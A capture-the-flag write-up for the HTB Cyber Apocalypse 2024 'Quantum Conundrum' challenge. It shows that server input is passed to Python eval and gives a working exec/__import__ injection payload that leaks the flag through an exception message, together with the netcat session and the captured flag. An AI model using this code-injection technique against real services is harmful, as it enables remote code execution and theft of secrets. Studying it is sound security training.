# HTB Cyber Apocalypse 2024: Hacker Royale - Quantum Conundrum

## Challenge

> KORP™, the heartless corporation orchestrating our battles in The Fray, has pushed us to our limits. Refusing to be a pawn in their twisted game, I've learned of a factionless rebel alliance plotting to dismantle KORP™. While it may sound like mere whispers, there's a chance it holds truth. Rumors suggest they've concealed a vital communication system within The Fray, powered by cutting-edge quantum computing technology. Unfortunately, this system is reportedly malfunctioning. If I can restore this communication network, it could be the key to toppling KORP™ once and for all. However, my knowledge of quantum computing is limited. This is where you come in! As I infiltrate The Fray to access the system, I'll rely on your expertise to identify and repair the issue. Are you up for the challenge? Together, we can make a difference in this battle against oppression.

## Metadata

- Difficulty: medium
- Creator: makelaris
- Files: [`challenge`](files/challenge)
- Docker: yes
- Tags: 
- Points: `325`
- Number of solvers: 

## Solution

This one was an unintended solution from us. One of my teammates (`@veloxer`) started this challenge and asked for some new ideas at 1 AM. We immediatelly identified that there is an `eval` in the application which might be exploitable.

But moving a few steps back (the [`challenge`](files/challenge) folder contains the challenge files):
- The `server.py` from line 34 to 39 read our user input and passes it directly to `CommunicationSystem.add_instructions()`

```python
        input: typing.List = req.recv(4096).decode().strip().split(";")
        req.sendall(b"\n % Testing quantum circuit, please wait...\n")
        tests_passes = []
        for _ in range(100):
            communication_system: CommunicationSystem = start_communication_system()
            communication_system.add_instructions(input)
```

- The in `__init__.py` our input is evaluated with `eval`

```python
    def add_instructions(self, instructions: typing.List):
        if len(instructions) > 10:
            raise CommunicationSystemException("Instruction set is too big")
        [self._add_gate(CircuitInstruction(**(eval(gate)))) for gate in instructions]
```

`eval` only allows one statement, but we can start with `exec` which can handle multiple statements. We can test our theory by inputing `time.sleep(5)`, the server will wait 5 seconds.

Now we have a few options:
- Blindly leak the characters of the flag
- Or throw a `CommunicationSystemException` with the `flag` as the message, the message will be sent by the server, the following payload will work:

```python
exec('raise __import__("communication_system").exceptions.CommunicationSystemException(__import__("secret").flag)')
```

```
nc 83.136.254.223 38229

|--------------------------------------------|
| Quantum Renegades Communication System     |
|--------------------------------------------|
| + System initilization  [Success!]         |
| + Quantum Circuit tests [Failed...]        |
| + Receiver decoding     [Success!]         |
|                                            |
| > Input instruction set for fix...         |
|                                            |
|--------------------------------------------|

> exec('raise __import__("communication_system").exceptions.CommunicationSystemException(__import__("secret").flag)')

 % Testing quantum circuit, please wait...

HTB{4lways_us3_a_b3ll_4_t3leportat1on}
```

Flag: `HTB{4lways_us3_a_b3ll_4_t3leportat1on}`

You can read the intended solution at <https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/misc/%5BMedium%5D%20Quantum%20Conundrum>